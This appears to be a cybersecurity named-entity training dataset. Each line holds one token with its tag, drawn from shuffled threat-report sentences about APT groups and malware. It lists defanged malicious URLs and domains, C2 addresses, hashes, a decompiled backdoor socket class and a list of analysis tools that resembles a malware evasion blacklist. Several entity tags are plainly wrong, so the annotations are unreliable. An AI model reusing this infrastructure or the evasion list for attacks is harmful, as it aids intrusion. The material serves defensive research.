hxxp://charliewestsecurity[.]co.za//db_template.php	B-url.unknown
hxxp://beehiveholdingszar[.]co.za//db_template.php	B-url.unknown
hxxp://analyticalfootball[.]com//db_template.php	B-url.unknown
hxxp://apiiination[.]com/leadership/db_template.php	B-url.unknown
hxxps://ahelicoptermom[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://servicebox[.]co.za//db_template.php	B-url.unknown
hxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.php	B-url.unknown
hxxps://aquo[.]in//db_template.php	B-url.unknown
hxxps://www.alfransia[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://www.icsswaziland[.]com//db_template.php	B-url.unknown
hxxp://aiko.pro//db_template.php	B-url.unknown
hxxps://alceharfield[.]com//db_template.php	B-url.unknown
hxxp://indocraft[.]co.za/test/db_template.php	B-url.unknown
hxxp://allegiancesecurity[.]org//db_template.php	B-url.unknown
hxxp://sullivanprimary[.]co.za//db_template.php	B-url.unknown
hxxp://www.apmequestrian[.]com//db_template.php	B-url.unknown
hxxps://alphawaves[.]org/wp-admin/db_template.php	B-url.unknown
hxxp://www.alexandrasternin[.]com/illustration/db_template.php	B-url.unknown
hxxp://www.daleth[.]co.za//db_template.php	B-url.unknown
hxxp://jwseshowe[.]co.za/assets/db_template.php	B-url.unknown
hxxp://winagainstebola[.]com//db_template.php	B-url.unknown
hxxp://anubandh[.]in//db_template.php	B-url.unknown
hxxp://www.alexanderhomestead[.]com//db_template.php	B-url.unknown
hxxp://alfatek-intelligence[.]com//db_template.php	B-url.unknown
hxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://alorabrownies[.]com/wp-admin/db_template.php	B-url.unknown
hxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.php	B-url.unknown
hxxp://cazochem[.]co.za/cazochem/db_template.php	B-url.unknown
hxxp://debnoch[.]com/image/db_template.php	B-url.unknown
hxxp://hmholdings360[.]co.za//db_template.php	B-url.unknown
hxxp://iinvest4u[.]co.za//db_template.php	B-url.unknown
hxxp://burgercoetzeeattorneys[.]co.za//db_template.php	B-url.unknown
hxxp://anngrigphoto[.]com//db_template.php	B-url.unknown
hxxp://alchemistasonida[.]com//db_template.php	B-url.unknown
hxxp://anahera[.]biz/admin/db_template.php	B-url.unknown
hxxp://h-u-i[.]co.za/heiren/db_template.php	B-url.unknown
hxxp://h-u-i[.]co.za/heiren/db_template.php	B-url.unknown
hxxp://insta-art[.]co.za//db_template.php	B-url.unknown
hxxp://muallematsela[.]com//db_template.php	B-url.unknown
hxxp://aguasdecastilla[.]com/uploads/db_template.php	B-url.unknown
hxxp://www.arabgamenetwork[.]com//db_template.php	B-url.unknown
hxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.php	B-url.unknown
hxxp://amruthavana[.]com/blog/db_template.php	B-url.unknown
hxxp://digitalblue[.]co.za//db_template.php	B-url.unknown
hxxps://www.alvarezarquitectos[.]com//db_template.php	B-url.unknown
hxxp://buboobioinnovations[.]co.za/wpimages/db_template.php	B-url.unknown
hxxp://andrewsbisom[.]com//db_template.php	B-url.unknown
hxxp://www.m-3[.]co.za//db_template.php	B-url.unknown
hxxp://beesrenovations[.]co.za/images/db_template.php	B-url.unknown
hxxps://www.apliety[.]co.il/wp-includes/db_template.php	B-url.unknown
hxxp://alchamelup[.]org/htdocs/db_template.php	B-url.unknown
hxxp://benonicoc[.]co.za/resources/db_template.php	B-url.unknown
hxxps://al-mostakbl[.]com//db_template.php	B-url.unknown
hxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.php	B-url.unknown
hxxp://andrespazsoldan[.]com//db_template.php	B-url.unknown
hxxp://in2accounting[.]co.za//db_template.php	B-url.unknown
hxxp://aipa[.]ca//db_template.php	B-url.unknown
hxxp://alphabee.fund/PHPMailer_5.2.0/db_template.php	B-url.unknown
hxxp://arabsdeals[.]com//db_template.php	B-url.unknown
hxxps://archiotronic[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://capewindstrading[.]co.za//db_template.php	B-url.unknown
hxxps://althurayaa[.]com//db_template.php	B-url.unknown
hxxp://jhphotoedits[.]co.za//db_template.php	B-url.unknown
hxxp://cloudhub.co.ls/modules/db_template.php	B-url.unknown
hxxp://apironco[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://digital-cameras-south-africa[.]co.za/script/db_template.php	B-url.unknown
hxxp://ahmadhasanat[.]com//db_template.php	B-url.unknown
hxxp://alexrocchi[.]com//db_template.php	B-url.unknown
hxxp://aljaadi[.]com//db_template.php	B-url.unknown
hxxps://www.engeltjieakademie[.]co.za//db_template.php	B-url.unknown
hxxp://annabelle[.]nl/next/db_template.php	B-url.unknown
hxxp://juniorad[.]co.za/vendor/db_template.php	B-url.unknown
hxxp://animationpulse[.]net//db_template.php	B-url.unknown
hxxp://angloglot[.]com//db_template.php	B-url.unknown
hxxp://agricolavicuna.cl//db_template.php	B-url.unknown
hxxp://alexelgy[.]com/allaccess/db_template.php	B-url.unknown
hxxp://www.centreforgovernance[.]uk//db_template.php	B-url.unknown
hxxp://www.aliandconsulting[.]com//db_template.php	B-url.unknown
hxxp://balaateen[.]co.za/less/db_template.php	B-url.unknown
hxxp://aleksicdunja[.]com//db_template.php	B-url.unknown
hxxp://arestihome[.]com//db_template.php	B-url.unknown
hxxp://am1int.fcomet[.]com/wp1/db_template.php	B-url.unknown
hxxp://anet-international-group[.]com/shop/db_template.php	B-url.unknown
hxxp://courtesydriving[.]co.za/js/db_template.php	B-url.unknown
hxxp://annaplebanek[.]com//db_template.php	B-url.unknown
hxxp://agencijazemil[.]com//db_template.php	B-url.unknown
hxxp://airminumtiro[.]com//db_template.php	B-url.unknown
hxxp://www.androidwikihow[.]com//db_template.php	B-url.unknown
hxxp://alisabyfinna[.]com//db_template.php	B-url.unknown
hxxp://rma-law[.]co.za//db_template.php	B-url.unknown
hxxp://amari[.]ro/components/db_template.php	B-url.unknown
hxxp://anxiousandunstoppable[.]com//db_template.php	B-url.unknown
hxxp://www.buhlebayoacademy[.]com//db_template.php	B-url.unknown
hxxp://arabellajo[.]com/wp/wp-includes/db_template.php	B-url.unknown
hxxp://blackthorn[.]co.za//db_template.php	B-url.unknown
hxxp://alaqaba[.]com/dnsarabia[.]com/db_template.php	B-url.unknown
hxxp://airesis.blog/wp-admin/db_template.php	B-url.unknown
hxxp://www.aptibet[.]org//db_template.php	B-url.unknown
hxxp://alecattic[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://anglero[.]com//db_template.php	B-url.unknown
hxxp://getabletravel[.]co.za/wpscripts/db_template.php	B-url.unknown
hxxp://www.allwestdental[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://printernet[.]co.za//db_template.php	B-url.unknown
hxxp://genesisbs[.]co.za//db_template.php	B-url.unknown
hxxp://allsporthealthandfitness[.]com//db_template.php	B-url.unknown
hxxp://www.humorcarbons[.]com//db_template.php	B-url.unknown
hxxp://intelligentprotection[.]co.za//db_template.php	B-url.unknown
hxxp://amazethings[.]com//db_template.php	B-url.unknown
hxxp://incoso[.]co.za/images/db_template.php	B-url.unknown
hxxp://www.antoanetapalikarska[.]com//db_template.php	B-url.unknown
hxxps://www.alteaparadise[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://amirmenahem[.]com//db_template.php	B-url.unknown
hxxp://isound[.]co.za//db_template.php	B-url.unknown
hxxp://www.alestilorachel[.]com//db_template.php	B-url.unknown
hxxp://alcfm[.]net/wp-admin/db_template.php	B-url.unknown
hxxp://www.acer-parts[.]co.za//db_template.php	B-url.unknown
hxxp://www.gsmmid[.]com//db_template.php	B-url.unknown
hxxp://skhaleni[.]co.za//db_template.php	B-url.unknown
hxxps://amiici.vision//db_template.php	B-url.unknown
hxxps://andihaas[.]at/wp-includes/db_template.php	B-url.unknown
hxxp://www.albertaprimebeef[.]com//db_template.php	B-url.unknown
hxxps://www.appster[.]it/wp-includes/db_template.php	B-url.unknown
hxxp://amofoundation[.]org/wp-includes/db_template.php	B-url.unknown
hxxp://iqra[.]co.za/pub/db_template.php	B-url.unknown
hxxp://thecompasssolutions[.]co.za//db_template.php	B-url.unknown
hxxp://archwaycarpetscrm[.]co[.]uk//db_template.php	B-url.unknown
hxxp://iggleconsulting[.]com//db_template.php	B-url.unknown
hxxps://angel-blanco[.]net/wp-includes/db_template.php	B-url.unknown
hxxps://anotherdayinparadise[.]ca//db_template.php	B-url.unknown
hxxp://www.bitp[.]co.za//db_template.php	B-url.unknown
hxxp://cupboardcure[.]co.za/vendor/db_template.php	B-url.unknown
hxxp://all2wedding[.]com/wp-includes/db_template.php	B-url.unknown
hxxp://allianz[.]com.pe/wp-admin/db_template.php	B-url.unknown
hxxp://amiehepperlin[.]com//db_template.php	B-url.unknown
hxxps://www.amighini[.]it/webservice/db_template.php	B-url.unknown
hxxp://broken-arrow[.]co.za//db_template.php	B-url.unknown
hxxp://www.ihlosiqs-pm[.]co.za//db_template.php	B-url.unknown
hxxp://alisimple[.]si/wp-includes/db_template.php	B-url.unknown
hxxp://allthat[.]social//db_template.php	B-url.unknown
hxxp://allthat[.]social//db_template.php	B-url.unknown
hxxp://www.amphibiblechurch[.]com//db_template.php	B-url.unknown
hxxp://bestencouragementwords[.]com//db_template.php	B-url.unknown
hxxp://alayhamtechnologies[.]com//db_template.php	B-url.unknown
hxxps://alaskanharvestseafood[.]com/backup/db_template.php	B-url.unknown
hxxps://www.air-mag[.]ro//db_template.php	B-url.unknown
hxxp://get-paid-for-online-survey[.]com//db_template.php	B-url.unknown
hxxp://www.antc[.]ch/wp-includes/db_template.php	B-url.unknown
hxxp://firstchoiceproperties[.]co.za//db_template.php	B-url.unknown
hxxp://habibtextiles[.]pk//db_template.php	B-url.unknown
hxxp://fsproperties[.]co.za/engine1/db_template.php	B-url.unknown
hxxp://diegemmerkat[.]co.za//db_template.php	B-url.unknown
hxxp://molepetravel.co.ls//db_template.php	B-url.unknown
hxxp://mmetl[.]co.za//db_template.php	B-url.unknown
hxxp://altrablog[.]com//db_template.php	B-url.unknown
hxxp://abrahamseed[.]co.za//db_template.php	B-url.unknown
hxxp://www.amerindgen[.]com/author/admin1/db_template.php	B-url.unknown
hxxp://altcoinaddict[.]com//db_template.php	B-url.unknown
hxxp://iiee.edu[.]pk//db_template.php	B-url.unknown
hxxp://cmhts[.]co.za/resources/db_template.php	B-url.unknown
hxxp://domesticguardians[.]co.za/Banner/db_template.php	B-url.unknown
hxxps://amishcountryfurnishings[.]com//db_template.php	B-url.unknown
hxxps://allday[.]gr//db_template.php	B-url.unknown
hxxp://www.alinn-u-yin[.]com//db_template.php	B-url.unknown
hxxps://www.allin-chain[.]com//db_template.php	B-url.unknown
hxxps://www.anatapackaging[.]com/vendors/db_template.php	B-url.unknown
hxxp://alexcelts[.]com/wp/db_template.php	B-url.unknown
hxxp://www.allstylus[.]com.br//db_template.php	B-url.unknown
hxxp://www.algom-law[.]com//db_template.php	B-url.unknown
hxxp://ambiances-toiles[.]fr//db_template.php	B-url.unknown
win32_remote	O
win64_remote64	O
ollydbg	O
ProcessHacker	O
tcpview	O
autoruns	O
autorunsc	O
filemon	O
procmon	O
regmon	O
regmon	O
procexp	O
idaq	O
idaq64	O
ImmunityDebugger	O
Wireshark	O
dumpcap	O
HookExplorer	O
ImportREC	O
PETools	O
LordPE	O
dumpcap	O
SysInspector	O
proc_analyzer	O
sysAnalyzer	O
sniff_hit	O
windbg	O
joeboxcontrol	O
joeboxserver	O
This	O
entry	O
was	O
posted	O
on	O
Tue	O
Mar	O
13	O
12:15	O
EDT	O
2018	O
and	O
filed	O
under	O
Yogesh	O
Londhe	O
,	O
Dileep	O
Kumar	O
Jallepalli	O
,	O
Ben	O
Read	O
,	O
Iran	O
,	O
Spear	O
Phishing	B-malware.drop
,	O
and	O
Sudeep	O
Singh	O
.	O

adineohler[.]com	B-url.unknown
aisicoin[.]com	B-url.unknown
alicervois[.]com	B-url.unknown
anessallie[.]com	B-url.unknown
antenham[.]com	B-url.unknown
arinaurna[.]com	B-url.unknown
arkoimmerma[.]com	B-url.unknown
aulolloy[.]com	B-url.unknown
avidilleneu[.]com	B-url.unknown
avidsontre[.]com	B-url.unknown
aximilian[.]com	B-url.unknown
biasatts[.]com	B-url.unknown
braydenhateaub[.]com	B-url.unknown
carosseda[.]com	B-url.unknown
chascloud[.]com	B-url.unknown
dreyoddu[.]com	B-url.unknown
dwarduong[.]com	B-url.unknown
eckenbaue[.]com	B-url.unknown
eighrimeau[.]com	B-url.unknown
errellawle[.]com	B-url.unknown
erstin[.]com	B-url.unknown
frahreiner[.]com	B-url.unknown
hieryells[.]com	B-url.unknown
hristophe[.]com	B-url.unknown
ichardt[.]com	B-url.unknown
icmannaws[.]com	B-url.unknown
iecopeland[.]com	B-url.unknown
irkaimboeuf[.]com	B-url.unknown
jamedalue[.]com	B-url.unknown
jamyer[.]com	B-url.unknown
jeanessbinder[.]com	B-url.unknown
jeffreyue[.]com	B-url.unknown
keoucha[.]com	B-url.unknown
laudiaouc[.]com	B-url.unknown
lbertussbau[.]com	B-url.unknown
loridanase[.]com	B-url.unknown
marrmann[.]com	B-url.unknown
meroque[.]com	B-url.unknown
moureuxacv[.]com	B-url.unknown
myolton[.]com	B-url.unknown
nasahlaes[.]com	B-url.unknown
ntjeilliams[.]com	B-url.unknown
omasicase[.]com	B-url.unknown
onnaha[.]com	B-url.unknown
onteagle[.]com	B-url.unknown
orinneamoure[.]com	B-url.unknown
orresto[.]com	B-url.unknown
orrislark[.]com	B-url.unknown
rackerasr[.]com	B-url.unknown
rcuselynac[.]com	B-url.unknown
sanauer[.]com	B-url.unknown
stopherau[.]com	B-url.unknown
tefanie[.]com	B-url.unknown
tefanortin[.]com	B-url.unknown
tephens[.]com	B-url.unknown
traveroyce[.]com	B-url.unknown
tsworthoa[.]com	B-url.unknown
ucaargo[.]com	B-url.unknown
ucairtz[.]com	B-url.unknown
urnage[.]com	B-url.unknown
venionne[.]com	B-url.unknown
virginiaar[.]com	B-url.unknown

During	O
our	O
research	O
,	O
we	O
found	O
that	O
IHU	O
was	O
also	O
very	O
interested	O
in	O
Spanish	O
higher	O
educational	O
establishments	O
and	O
specific	O
government	O
departments	O
.	O

The	O
main	O
difference	O
with	O
the	O
other	O
malware	O
is	O
the	O
C2	O
server	O
.	O

/iec/	O
From	O
April	O
2016	O
until	O
at	O
least	O
February	O
2017	O
,	O
attackers	O
have	O
been	O
spreading	O
malware	O
via	O
fake	O
Facebook	O
profiles	O
and	O
pages	O
,	O
breached	O
websites	O
,	O
self-hosted	O
and	O
cloud	O
based	O
websites	O
.	O

In	O
addition	O
,	O
rtniczw.sys	O
used	O
a	O
registry	O
key	O
and	O
configuration	O
data	O
block	O
that	O
was	O
not	O
used	O
in	O
Stuxnet	B-malware.backdoor
.	O

The	O
0day	O
vulnerability	O
was	O
fixed	O
and	O
it	O
was	O
named	O
CVE-2018-8174	B-malware.unknown
.	O

Similar	O
to	O
the	O
previously	O
analyzed	O
sample	O
,	O
it	O
is	O
also	O
using	O
image	O
steganography	O
and	O
memory	O
reflection	O
loading	O
.	O

Leveraging	O
its	O
global	O
network	O
of	O
cybersecurity	O
labs	O
,	O
deep	O
industry	O
understanding	O
across	O
client	O
value	O
chains	O
and	O
services	O
that	O
span	O
the	O
security	O
lifecycle	O
,	O
Accenture	O
protects	O
organization	O
's	O
valuable	O
assets	O
,	O
end-to-end	O
.	O

Knowledge	O
of	O
the	O
tactics	O
,	O
techniques	O
,	O
and	O
procedures	O
(	O
TTPs	O
)	O
used	O
by	O
the	O
operators	O
behind	O
this	O
campaign	O
helps	O
to	O
better	O
inform	O
detection	O
and	O
response	O
to	O
attacks	O
by	O
this	O
threat	O
group	O
.	O

Conclusion	O
9	O
.	O

Many	O
of	O
the	O
threat	O
actors	O
in	O
the	O
Middle	O
East	O
that	O
we	O
're	O
familiar	O
with	O
have	O
extremely	O
volatile	O
IP	O
hosting	O
,	O
owing	O
to	O
the	O
fact	O
that	O
the	O
infrastructure	O
is	O
likely	O
to	O
be	O
hosted	O
on	O
their	O
own	O
networks	O
.	O

The	O
response	O
string	O
is	O
decoded	O
and	O
parsed	O
for	O
the	O
following	O
commands	O
:	O
'm	O
'	O
:	O
executes	O
a	O
shell	O
command	O
'	O
u	O
'	O
:	O
uploads	O
a	O
file	O
to	O
the	O
victim	O
(	O
downloads	O
a	O
file	O
from	O
the	O
victim	O
's	O
perspective	O
)	O
'd	O
'	O
:	O
downloads	O
a	O
file	O
to	O
the	O
attacker	O
(	O
uploads	O
a	O
file	O
from	O
the	O
victim	O
's	O
perspective	O
)	O
'	O
R	O
'	O
:	O
removes	O
the	O
auto­run	O
registry	O
value	O
These	O
commands	O
are	O
referenced	O
in	O
the	O
code	O
in	O
this	O
order	O
,	O
and	O
when	O
said	O
aloud	O
it	O
sounds	O
like	O
'	O
mutter	B-malware.backdoor
'	O
,	O
hence	O
the	O
name	O
chosen	O
for	O
the	O
malware	O
.	O

The	O
series	O
will	O
culminate	O
with	O
a	O
CrowdCast	O
in	O
April	O
2014	O
detailing	O
a	O
case	O
study	O
of	O
the	O
incident	O
response	O
investigation	O
conducted	O
to	O
identify	O
these	O
web	O
shells	B-malware.backdoor
.	O

Other	O
mitigation	O
strategies	O
include	O
a	O
multilayered	O
approach	O
to	O
securing	O
the	O
organization	O
's	O
perimeter	O
,	O
which	O
includes	O
hardening	O
the	O
endpoints	O
and	O
employing	O
application	O
control	O
to	O
help	O
prevent	O
malicious	O
applications	O
and	O
processes	O
from	O
being	O
executed	O
.	O

Following	O
this	O
,	O
a	O
POST	O
request	O
is	O
sent	O
to	O
the	O
C	O
&	O
C	O
every	O
once	O
in	O
a	O
while	O
(	O
/api/serv/requests/	B-url.cncsvr
[	I-url.cncsvr
base64_fingerprint	I-url.cncsvr
]	O
)	O
,	O
and	O
in	O
turn	O
,	O
the	O
C	O
&	O
C	O
sends	O
back	O
a	O
configuration	O
file	O
that	O
turns	O
on	O
specific	O
functionalities	O
of	O
the	O
malware	O
.	O

Logging	O
details	O
about	O
the	O
system	O
.	O

The	O
list	O
of	O
indicators	O
of	O
compromise	O
,	O
which	O
includes	O
Trend	O
Micro	O
's	O
corresponding	O
detections	O
and	O
solutions	O
,	O
is	O
in	O
this	O
appendix	O
.	O

a	O
global	O
corporation	O
based	O
in	O
Asia	O
with	O
the	O
goal	O
of	O
stealing	O
proprietary	O
business	O
information	O
.	O

The	O
problem	O
is	O
not	O
that	O
traditional	O
methods	O
do	O
not	O
work	O
.	O

Analysts	O
noting	O
the	O
similarity	O
did	O
not	O
have	O
to	O
visit	O
the	O
street	O
to	O
determine	O
that	O
it	O
was	O
unlikely	O
that	O
they	O
each	O
resided	O
in	O
different	O
homes	O
on	O
the	O
same	O
street	O
.	O

The	O
Dropper	O
,	O
pretending	O
to	O
be	O
a	O
Pokemon	O
Go	O
app	O
,	O
adds	O
an	O
icon	O
to	O
the	O
phone	O
dashboard	O
.	O

EC5B360F5FF6251A08A14A2E95C4CAA4	B-hash
hint1.zapto.org	B-url.cncsvr

The	O
main	O
CozyDuke	B-malware.drop
dropper	O
,	O
used	O
for	O
infecting	O
hosts	O
with	O
CozyDuke	B-malware.drop
,	O
begins	O
by	O
checking	O
whether	O
the	O
victim	O
has	O
an	O
anti-virus	O
product	O
installed	O
.	O

The	O
malware	O
spreads	O
very	O
fast	O
using	O
Telegram	O
messenger	O
application	O
in	O
smartphones	O
,	O
targeting	O
high-profile	O
Libyan	B-malware.infosteal
influential	O
and	O
political	O
figures	O
.	O

Another	O
interesting	O
result	O
that	O
came	O
from	O
the	O
research	O
concerns	O
the	O
samples	O
attributed	O
to	O
Advanced	O
Persistent	O
Threat	O
(	O
APT	B-malware.unknown
)	O
campaigns	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
network	O
traffic	O
generated	O
as	O
a	O
result	O
of	O
macro	O
code	O
executing	O
the	O
PowerShell	O
script	O
.	O

These	O
are	O
not	O
conducted	O
through	O
separate	O
attacks	O
;	O
rather	O
,	O
they	O
comprise	O
of	O
a	O
series	O
of	O
attempts	O
over	O
time	O
to	O
get	O
deeper	O
and	O
deeper	O
into	O
a	O
target	O
's	O
network	O
.	O

Figure	O
7	O
:	O
The	O
components	O
dropped	O
in	O
the	O
%	O
Application	O
Data	O
%	O
\Microsoft\CLR\*	O
directory	O

getInstalledApps	O
]	O

We	O
acquired	O
multiple	O
versions	O
of	O
DUBNIUM	B-malware.drop
droppers	O
through	O
our	O
daily	O
operations	O
.	O

HBGary	O
's	O
Digital	O
DNATM	O
database	O
not	O
only	O
codifi	O
es	O
the	O
behavior	O
of	O
software	O
,	O
but	O
also	O
the	O
coding	O
idioms	O
,	O
algorithms	O
,	O
and	O
methods	O
of	O
individual	O
developers	O
.	O

The	O
malware	O
has	O
been	O
in	O
development	O
since	O
at	O
least	O
2006	O
.	O

%	O
USERHASH	O
%	O
-	O
Hash	O
of	O
the	O
login	O
name	O
%	O
USER	O
%	O
-	O
Login	O
name	O
%	O
SEQ	O
%	O
-	O
Assumed	O
to	O
be	O
the	O
sequence	O
number	O
of	O
dump	O
files	O
created	O
by	O
Babar	B-malware.drop
%	O
KID	O
%	O
-	O
Assumed	O
to	O
be	O
the	O
ID	O
of	O
a	O
subsequently	O
infected	O
process	O
%	O
ID	O
%	O
-	O
Value	O
retrieved	O
from	O
hardcoded	O
configuration	O
%	O
SELFDIR	O
%	O
-	O
Executable	O
directory	O
%	O
SELF	O
%	O
-	O
Executable	O
name	O
Values	O
retrieved	O
from	O
Windows	O
environment	O
:	O
%	O
APPDATA	O
%	O
%	O
USERPROFILE	O
%	O
%	O
WINDIR	O
%	O
%	O
COMMON_APPDATA	O
%	O
%	O
ALLUSERPROFILE	O
%	O
%	O
CommonProgramFiles	O
%	O

At	O
the	O
time	O
of	O
this	O
writing	O
,	O
it	O
is	O
unclear	O
to	O
what	O
degree	O
and	O
for	O
how	O
long	O
this	O
specific	O
application	O
was	O
utilized	O
by	O
the	O
entirety	O
of	O
the	O
Ukrainian	O
Artillery	O
Forces	O
.	O

//	O
destructor	O
class	O
BD_SOCK	O
//	O
members	O
~BD_SOCK	O
(	O
)	O
;	O
BD_SOCK*	O
Copy	O
(	O
bool	O
fCopySocket	O
)	O
;	O
//	O
duplicate	O
object	O
//	O
member	O
variables	O
DWORD	O
dwLastError	O
;	O
char	O
szHostName	O
[	O
256	O
]	O
;	O
DWORD	O
dwListeningPortNumber	O
;	O
SOCKET	O
sktRemoteEndpoint	O
;	O
SOCKET	O
hListeningSocket	O
;	O
class	O
PCC_SOCK	O
:	O
BD_SOCK	O
~PCC_SOCK	O
(	O
)	O
;	O
//	O
destructor	O
//	O
virtual	O
members	O
PCC_SOCK	O
*	O
Copy	O
(	O
bool	O
fCopyListeningSocket	O
)	O
;	O
SOCKET	O
ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake	O
(	O
int	O
a2	O
,	O
int	O
a3	O
,	O
int	O
a4	O
,	O
int	O
a5	O
,	O
char	O
*pszHostname	O
,	O
int	O
wHostPort	O
)	O
;	O
SOCKET	O
ConnectToRemoteEndpointByNameAndHandshake	O
(	O
char	O
*pszHostname	O
,	O
int	O
wHostPort	O
)	O
;	O
SOCKET	O
ConnectToRemoteEndpointByNameAndPerformPOSTLogin	O
(	O
char	O
*pszHostname	O
,	O
int	O
wHostPort	O
)	O
;	O
SOCKET	O
WaitForClient	O
(	O
)	O
;	O
int	O
SendEncodedData	O
(	O
int	O
dwPktType	O
,	O
void	O
*payload	O
,	O
size_t	O
dwPayloadSize	O
)	O
;	O
int	O
RecvEncodeData	O
(	O
DWORD	O
*pdwPktType	O
,	O
char	O
**pvPayload	O
,	O
DWORD	O
*pdwPayloadSize	O
)	O
;	O
void	O
freeMemory	O
(	O
void	O
*pMemory	O
)	O
;	O
//	O
member	O
functions	O
int	O
SendVictimInfo	O
(	O
)	O
;	O
int	O
WaitForReadEvent	O
(	O
int	O
dwTimeout	O
)	O
;	O
int	O
SOCKSConnectWithRandomLocalPort	O
(	O
int	O
dwEndPointIP	O
,	O
u_short	O
hostshort	O
)	O
;	O
int	O
BindToRandomPort	O
(	O
SOCKET	O
s	O
)	O
;	O
int	O
SendBuffer	O
(	O
SOCKET	O
s	O
,	O
char	O
*buf	O
,	O
int	O
len	O
)	O
;	O
SOCKET	O
AcceptIncomingConnection	O
(	O
)	O
;	O
SOCKET	O
ConnectToRemoteEndpointByName	O
(	O
char	O
*szHostName	O
,	O
int	O
hostshort	O
)	O
;	O
SOCKET	O
ConnectToRemoteEndpoint	O
(	O
int	O
dwIP	O
,	O
u_short	O
wPort	O
)	O
;	O
int	O
ReadFromRemoteEndpoint	O
(	O
char	O
*buf	O
,	O
int	O
len	O
)	O
;	O
SOCKET	O
NewSocket	O
(	O
)	O
;	O
int	O
BindSocket	O
(	O
SOCKET	O
s	O
,	O
int	O
dwLowPort	O
,	O
int	O
dwHighPort	O
)	O
;	O
int	O
SendAuthenicationResponse	O
(	O
void	O
*pvResponse	O
)	O
;	O
int	O
SendHTTP200ResponseIfViaHeaderFound	O
(	O
char	O
*Str	O
)	O
;	O
//	O
member	O
variables	O
char	O
compressionBuffer	O
[	O
65536	O
]	O
;	O

root9B	O
analysts	O
began	O
to	O
dissect	O
the	O
data	O
at	O
hand	O
to	O
identify	O
common	O
tactics	O
,	O
techniques	O
,	O
and	O
procedures	O
used	O
by	O
the	O
adversaries	O
which	O
could	O
provide	O
further	O
information	O
about	O
the	O
planned	O
hack	O
,	O
including	O
information	O
about	O
potential	O
attack	O
vectors	O
.	O

Comparisons	O
to	O
other	O
modules	O
quickly	O
shows	O
a	O
delineation	O
in	O
other	O
Sofacy	O
efforts	O
.	O

Analysis	O
of	O
the	O
file	O
with	O
MD5	O
Hash	O
:	O
B9AF5F5FD434A65D7AA1B55F5441C90A	B-hash

Since	O
2014	O
,	O
the	O
Inception	B-malware.backdoor
Framework	I-malware.backdoor
has	O
steadily	O
changed	O
its	O
tools	O
and	O
techniques	O
.	O

The	O
core	O
of	O
the	O
loop	O
that	O
scrambles	O
up	O
the	O
substitution	O
table	O
is	O
as	O
follows	O
:	O

As	O
time	O
has	O
gone	O
by	O
,	O
the	O
group	O
has	O
become	O
ever	O
more	O
secretive	O
,	O
hiding	O
behind	O
an	O
increasingly	O
complex	O
framework	O
of	O
proxies	O
and	O
cloud	O
services	O
.	O

We	O
still	O
consider	O
it	O
as	O
a	O
series	O
of	O
attack	O
incidents	O
based	O
on	O
other	O
comprehensive	O
analysis	O
.	O

2014	O
Vietnam	O
Network	O
Security	O
2014	O
Germany	O
Manufacturing	O
2015	O
Vietnam	O
Media	O
2016	O
Philippines	O
Consumer	O
products	O
2016	O
Vietnam	O
Banking	O
KOMPROGO	O
SOUNDBITE	O
BEACON	O
2016	O
Philippines	O
Technology	O
Infrastructure	O
WINDSHIELD	O
2016	O
China	O
Hospitality	O
2016	O
Vietnam	O
Media	O
2016	O
United	O
States	O
Consumer	O
Products	O
2017	O
United	O
Kingdom	O
Consulting	O
PHOREAL	O
BEACON	O
SOUNDBITE	O
SOUNDBITE	O
Table	O
1	O
:	O
APT32	B-malware.infosteal
Private	O
Sector	O
Targeting	O
Identified	O
by	O
FireEye	O
In	O
addition	O
to	O
focused	O
targeting	O
of	O
the	O
private	O
sector	O
with	O
ties	O
to	O
Vietnam	O
,	O
APT32	B-malware.infosteal
has	O
also	O
targeted	O
foreign	O
governments	O
,	O
as	O
well	O
as	O
Vietnamese	O
dissidents	O
and	O
journalists	O
since	O
at	O
least	O
2013	O
.	O

The	O
'	O
123456	O
'	O
cluster	O
also	O
contains	O
spam	O
in	O
the	O
English	O
language	O
,	O
leveraging	O
the	O
recent	O
tragedy	O
in	O
Kenya	O
as	O
a	O
lure	O
.	O

'	O
Nakashima	O
,	O
Ellen	O
.	O

The	O
domain	O
was	O
previously	O
hosted	O
on	O
an	O
Iranian	O
IP	O
5.144.130[.]23	B-ip.unknown
and	O
since	O
April	O
22	O
,	O
2017	O
,	O
points	O
at	O
German	O
VPS	O
IP	O
144.76.87[.]86	B-ip.unknown
.	O

If	O
the	O
target	O
filename	O
is	O
incorrect	O
or	O
invalid	O
the	O
plugin	O
file	O
is	O
deleted	O
and	O
the	O
registry	O
value	O
is	O
erased	O
.	O

When	O
clicked	O
,	O
it	O
would	O
redirect	O
to	O

Root	O
CA	O
Certificate	O
password	O
(	O
'	O
f*ck	O
your	O
mom123	O
'	O
was	O
in	O
Mandarin	O
)	O
We	O
also	O
suspect	O
most	O
of	O
the	O
victims	O
are	O
located	O
in	O
China	O
,	O
because	O
of	O
the	O
following	O
findings:.Searches	O
for	O
wallet	O
file	O
names	O
in	O
Chinese	O
on	O
victims	O
'	O
workstations	O
.	O

netstat	O
-ano	O
-	O
displays	O
protocols	O
statistics	O
and	O
current	O
TCP/IP	O
network	O
connections	O

The	O
file	O
sarbajit_leaked_video.wmv.scr	O
contains	O
a	O
compile	O
time	O
of	O
May	O
28	O
,	O
2013	O
19:53:26	O
UTC	O
.	O

However	O
,	O
analysis	O
indicated	O
that	O
some	O
files	O
were	O
still	O
intact	O
after	O
the	O
malware	O
's	O
write	O
operations	O
and	O
subsequent	O
system	O
reboot	O
.	O

BootXLoader	O
:	O
is	O
the	O
main	O
module	O
that	O
handles	O
the	O
initialization	O
procedures	O
.	O

'	O
Bennett	O
,	O
Cory	O
.	O

We	O
have	O
associated	O
this	O
campaign	O
with	O
APT19	B-malware.infosteal
,	O
a	O
group	O
that	O
we	O
assess	O
is	O
composed	O
of	O
freelancers	O
,	O
with	O
some	O
degree	O
of	O
sponsorship	O
by	O
the	O
Chinese	O
government	O
.	O

On	O
this	O
occasion	O
,	O
the	O
